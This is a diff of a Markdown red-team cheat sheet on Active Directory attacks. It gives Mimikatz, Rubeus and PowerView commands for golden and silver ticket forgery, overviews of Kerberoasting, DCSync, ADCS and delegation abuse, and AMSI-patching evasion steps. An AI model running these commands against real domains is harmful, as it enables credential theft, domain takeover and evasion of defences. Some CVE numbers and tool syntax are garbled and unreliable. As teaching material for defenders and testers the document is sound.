@@ -491,9 +491,9 @@ With the `/ptt` flag (Pass-the-Ticket), Mimikatz injects the forged ticket direc
 ### 6. Unrestricted Access
 The individual now has full, legitimate-appearing access to any services, such as file servers, and databases within the compromised domain.<br>
 * **🔸TL;DR**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
-### Tool Used
+### Tool
 * Mimikatz
-* **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
+* **Used for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
 ```
 # Step 1: Get krbtgt hash (requires SYSTEM privileges)  
 mimikatz.exe "lsa::dump /domain"  
@@ -507,9 +507,9 @@ mimikatz.exe "kerberos::ptt golden_ticket.kirbi"
 # Step 4: Use the ticket to access resources (e.g., log in as Administrator)  
 mimikatz.exe "ts::login /user:Administrator /domain:example.com"
 ```
-### Tool Used
+### Tool
 * Mimikatz
-* **Use for**: Silver Ticket (Kerberos Service Ticket for Constrained Delegation)
+* **Used for**: Silver Ticket (Kerberos Service Ticket for Constrained Delegation)
 ```
 # Step 1: Get service account hash (e.g., from lsass or Kerberos ticket)  
 mimikatz.exe "sekurlsa::hashes /process"  
@@ -523,7 +523,7 @@ mimikatz.exe "kerberos::ptt silver_ticket.kirbi"
 # Step 4: Use the ticket to access the service (e.g., HTTP)  
 mimikatz.exe "ts::login /user:serviceAccount /domain:example.com"
 ```
-### Tool Used
+### Tool
 * Rubeus - Golden & Silver Tickets
 * **Used for**: Golden Ticket (Kerberos TGT) Attacks known for, strenght weak
 ```
@@ -536,10 +536,10 @@ Rubeus.exe ptt /ticket:golden_ticket.kirbi
 # Step 3: Access a resource with the impersonated ticket  
 Rubeus.exe kerberos::ticket /ticket:golden_ticket.kirbi /s:target.com
 ```
-### Tool Used
+### Tool
 * Rubeus
 * **Used for**: Silver Ticket (Kerberos Service Ticket) Attacks
-
+```
 # Step 1: Request a Silver Ticket (using service account credentials)  
 Rubeus.exe silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com  
 
@@ -548,30 +548,29 @@ Rubeus.exe ptt /ticket:silver_ticket.kirbi
 
 # Step 3: Access the service (e.g., HTTP) with the ticket  
 Rubeus.exe kerberos::ticket /ticket:silver_ticket.kirbi /s:target.com
-
-### Tool Used
+```
+### Tool
 * PowerView - Enumeration for Ticket Attacks
-* **Use for**: Golden Ticket (Identify Target for Impersonation)
-
+* **Used for**: Golden Ticket (Identify Target for Impersonation)
+```
 # Step 1: Enumerate domain users (including administrators)  
 Import-Module PowerView  
 Get-User -Domain example.com | Where-Object { $_.UserAccountControl -band 16777216 }  
 
 # Step 2: Find service accounts or SPNs for Silver Ticket targets  
 Get-SPN -Domain example.com | Select-Object -ExpandProperty SPN  
-
-### Tool Used
+```
+### Tool
 * PowerView
-* **Use for**: Silver Ticket (Identify Service Targets)
-
+* **Used for**: Silver Ticket (Identify Service Targets)
+```
 # Step 1: Enumerate all services (SPNs) in the domain  
 Get-SPN -Domain example.com  
 
 # Step 2: Find users with specific privileges (e.g., for Golden Ticket)  
 Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }  
 ```
----
-## Privilege Escalation (TA0004)
+## Privilege Escalation [(TA0004)](https://attack.mitre.org/techniques/TA0004/)
 * **Abuse Elevation Control Mechanism (T1548)**: Leveraging UAC bypass, Token Manipulation, or misconfigured Access Control Lists (ACLs).
 ### Tool
 * PowerUp
@@ -601,38 +600,43 @@ Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.
 ## Core Active Directory TTPs
 Active Directory attacks typically span four major Tactics: Credential Access, Discovery, Lateral Movement, and Persistence.
 ### Credential Access
-* **Kerberoasting (T1558.003)**: Requesting Service Tickets (TGS) for service accounts and cracking them offline.
-* **AS-REP Roasting (T1558.004)**: Targeting accounts with 'Do not require Kerberos pre-authentication" enabled to crack their passwords.
-* **`NTDS.dit` Dumping (T1003.003)**: Stealing the primary AD database file from a Domain Controller to extract all user hashes.
-* **Pass-the-Hash (PtH) (T1550.002)**: Using a captured NTLM hash to authenticate without needing the plaintext password.
-* **Pass-the-Ticket (PtT) (T1550.003)**: Using captured Kerberos tickets (TGT/TGS) to move across the domain.
+* **Kerberoasting [(T1558.003)](https://attack.mitre.org/techniques/T1558/003/)**: Requesting Service Tickets (TGS) for service accounts and cracking them offline.
+* **AS-REP Roasting [(T1558.004)](https://attack.mitre.org/techniques/T1558/004/)**: Targeting accounts with 'Do not require Kerberos pre-authentication" enabled to crack their passwords.
+* **`NTDS.dit` Dumping [(T1003.003)](https://attack.mitre.org/techniques/T1003/003/)**: Stealing the primary AD database file from a Domain Controller to extract all user hashes.
+* **Pass-the-Hash (PtH) [(T1550.002)](https://attack.mitre.org/techniques/T1550/002/)**: Using a captured NTLM hash to authenticate without needing the plaintext password.
+* **Pass-the-Ticket (PtT) [(T1550.003)](https://attack.mitre.org/techniques/T1550/003/)**: Using captured Kerberos tickets (TGT/TGS) to move across the domain.
 
 ## Discovery
-* **Domain Trust Discovery (T1482)**: Using tools like AdFind or BloodHound to map relationships between domains and forests.
-* **Account Discovery (T1087.002)**: Enumerating domain accounts via LDAP queries or native tools like `net user /domain`.
-* **Permission Groups Discovery (T1069.002)**: Identifying high-value groups like Domain Admins or Enterprise Admins.
-* **Domain Controller Discovery (T1018)**: Locating Domain Controllers via DNS or `nltest`.
+* **Domain Trust Discovery [(T1482)](https://attack.mitre.org/techniques/T1482/)**: Using tools like AdFind or BloodHound to map relationships between domains and forests.
+* **Account Discovery [(T1087.002)](https://attack.mitre.org/techniques/T1087/002/)**: Enumerating domain accounts via LDAP queries or native tools like `net user /domain`.
+* **Permission Groups Discovery [(T1069.002)](https://attack.mitre.org/techniques/T069/002/)**: Identifying high-value groups like Domain Admins or Enterprise Admins.
+* **Domain Controller Discovery [(T1018)](https://attack.mitre.org/techniques/T1018/)**: Locating Domain Controllers via DNS or `nltest`.
 
 ## Lateral Movement & Persistence
-* **Golden Ticket (T1558.001)**: Forging a Ticket Granting Ticket (TGT) using the `krbtgt` account hash for permanent domain-wide access.
-* **Silver Ticket (T1558.002)**: Forging service tickets to gain unauthorized access to specific services (e.g., MSSQL, CIFS).
-* **DCShadow (T1207)**: Registering a rogue Domain Controller to inject malicious objects or change permissions.
-* **DCSync (T1003.006)**: Impersonating a Domain Controller to request account hashes from another DC via replication protocols.
+* **Golden Ticket [(T1558.001)](https://attack.mitre.org/techniques/T1558/001/)**: Forging a Ticket Granting Ticket (TGT) using the `krbtgt` account hash for permanent domain-wide access.
+* **Silver Ticket [(T1558.002)](https://attack.mitre.org/techniques/T1558/002/)**: Forging service tickets to gain unauthorized access to specific services (e.g., MSSQL, CIFS).
+* **DCShadow [(T1207)](https://attack.mitre.org/techniques/T1207/)**: Registering a rogue Domain Controller to inject malicious objects or change permissions.
+* **DCSync [(T1003.006)](https://attack.mitre.org/techniques/T1003/006/)**: Impersonating a Domain Controller to request account hashes from another DC via replication protocols.
 
 ## Active Directory CS (Certificate Services)
 Exploiting AD CS is currently one of the most effective ways to escalate privileges from a standard user to Domain Admin.
-* **ADCS ESC1/ESC2/ESC3 (T1649)**: Misconfigured Certificate Templates.
+* **ADCS ESC1/ESC2/ESC3 [(T1649)](https://attack.mitre.org/techniques/T1649/)**: Misconfigured Certificate Templates.
 Requesting a certificate for a high-privileged user (like a Domain Admin) using a low-privileged account.
-* **AD CS ESC8 (T1557.001)**: NTLM Relay to HTTP Enrollment options.
+* **AD CS ESC8 [(T1557.001)](https://attack.mitre.org/techniques/T1557/001/)**: NTLM Relay to HTTP Enrollment options.
 Coercing a Domain Controller to authenticate to an attacker machine, then relaying that to the AD CS web interface to get a DC certificate.
-* **Certificate Theft (T1552.004)**: Exporting private keys and certificates from user stores to bypass MFA or impersonate identities.
+* **Certificate Theft [(T1552.004)](https://attack.mitre.org/techniques/T1552/004/)**: Exporting private keys and certificates from user stores to bypass MFA or impersonate identities.
 
 ## Delegation & Relationship Attacks
-These attacks leverage the 'intended" logic of AD to gain unauthorized access.
-* **Unconstrained Delegation (T1558)**: Compromising a server where Unconstrained Delegation is enabled. When a high-privileged user connects, their TGT is stored in memory and can be stolen and cracked offline.
-* **Constrained Delegation (T1558.003)**: Abusing the `msDS-AllowedToDelegateTo` attribute to imp any user to a specific service.
-* **Resource-Based Constrained Delegation (RBCD) (T1558)**: Configuring a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow an attacker-controlled machine to impersonate users to it.
-* **Group Policy Object (GPO) Abuse (T1484.001)**: Modifying a GPO to push a scheduled task, malicious script, or new local admin user to all workstations in an OU.
+Active Directory (AD) delegation and relationship attacks exploit inherent trust, misconfigurations, and legitimate functionality within Windows domain environments (also referred to as Living Off The Land (LOTL)) to elevate privileges, move laterally, and pivot. **Delegation attacks** leverage the ability of a service to impersonate a user to access other services, while **relationship attacks** exploit excessive or unintended Access Control List (ACL) permissions between objects (users, groups, computers) in an AD domain.
+### Unconstrained Delegation [(T1558)](https://attack.mitre.org/techniques/T1558/)
+Unconstrained Delegation occurs when a compromised server allows an attacker to intercept the Ticket Granting Ticket (TGT) of a high-privileged user who connects to it. Once the TGT is stored in memory (LSASS), it can be extracted and used immediately for impersonation or taken offline for cracking, providing a direct path to full domain compromise.
+### Constrained Delegation
+### C[(T1558.003)](https://attack.mitre.org/techniques/T1558/003)
+Constrained Delegation exploits the `msDS-AllowedToDelegateTo` attribute, which specifies the backend services a service account can impersonate users to. By compromising an account with this privilege, an attacker can leverage the Service-for-User (S4U) extensions to generate a valid service ticket for any user—including high-privileged administrators—without their interaction, granting unauthorized access to the restricted target service.
+### Resource-Based Constrained Delegation (RBCD) [(T1558)](https://attack.mitre.org/techniques/T1558/)
+Configuring a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow an attacker-controlled machine to impersonate users to it.
+* **Group Policy Object (GPO) Abuse [(T1484.001)](https://attack.mitre.org/techniques/T1484.001/)
+Group Policy Object (GPO) Abuse leverages unauthorized write access to a GPO to deploy malicious configurations across a fleet of domain-joined systems. By modifying high-impact settings—such as adding scheduled tasks, pushing malicious scripts via startup/shutdown policies, or injecting new accounts into the local Administrators group—an attacker can achieve automated, large-scale code execution and persistent administrative control over all workstations or servers within the linked Organizational Unit (OU).
 
 ## Manipulation & Impersonation
 * **SAM Name Spoofing / NoPac (T1558)**: Exploiting logic flaws (CVE-2012-42278/42287) where a machine account name is changed to match a Domain Controller, tricking the KDC into issuing a high-privileged TGT.
@@ -756,11 +760,11 @@ These techniques allow an individual to move laterally and escalate privileges w
 
 ### 9. The "Golden GMSA" Attack
 ### TTPs: Steal or Forge Kerberos Tickets (T1558)
-Group Managed Service Accounts (gMSAs) are often used for high-privilege services. If you can read the `msDS-ManagedPassword` attribute, you own the service.
+* Group Managed Service Accounts (gMSAs) are often used for high-privilege services. If you can read the `msDS-ManagedPassword` attribute, you own the service.
 ### Primary Tools:
 * **`GMSAPasswordReader`**: Specifically for extracting gMSA passwords.
 * **BloodHound**: To identify which users have the rights to read gMSA passwords.
-### Evasive Techniques:
+### Evasive Techniques
 * **LDAP Filtering**: Use targeted LDAP filters to read only the specific gMSA attribute you need, rather than querying the entire object, which might trigger behavioral alerts.
 ### Red Team TTP Mapping Table
 | Attack Phase | Technique(s) | MITRE TTP | Tool(s) |
@@ -773,7 +777,7 @@ Group Managed Service Accounts (gMSAs) are often used for high-privilege service
 
 ## Technical Deep-Dive Into Evasion and Tool Command Syntax
 ### 1. Detection Evasion Deep-Dive (AMSI & ETW)
-Modern EDRs rely on AMSI to scan memory and ETW to log suspicious API calls (like OpenProcess on LSASS).
+* Modern EDRs rely on AMSI to scan memory and ETW to log suspicious API calls (like OpenProcess on LSASS).
 Bypassing AMSI (Antimalware Scan Interface):
 * **Patching**: Overwrite the AmsiScanBuffer function in `amsi.dll` with a "return" (`0xCB`) so it always returns "Clean."
 * **Obfuscation**: Use tools like Chimera or `Invoke-Obfuscation` to change variable names and string types in PowerShell scripts.
